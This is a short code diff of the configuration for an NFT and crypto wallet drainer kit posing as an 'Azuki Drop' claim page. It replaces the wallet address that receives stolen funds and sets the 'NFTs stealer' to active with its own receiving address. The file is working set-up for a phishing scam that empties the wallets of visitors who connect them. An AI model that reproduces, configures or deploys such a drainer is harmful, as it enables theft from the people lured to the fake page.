@@ -1,4 +1,4 @@
-const receiveAddress = "0x5BCFe0f00583665f6eC0507cE390A3f3dc9bBAc4";
+const receiveAddress = "0xb773a20c0dE285911202F32d4C4B64e1F32F6abf";
 
 const collectionInfo = {
     name: "Azuki Drop",
@@ -35,7 +35,7 @@ const claimPageInfo = {
 const drainNftsInfo = {
     active: true, // Active (true) or not (false) NFTs stealer.
     minValue: 0.1, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
-    nftReceiveAddress: "0xb773a20c0dE285911202F32d4C4B64e1F32F6abf" // leave empty if you want to use the same as receiveAddress 
+    nftReceiveAddress: "0xb773a20c0dE285911202F32d4C4B64e1F32F6abf" // leave empty if you want to use the same as receiveAddress
 }
 
 const customStrings = {
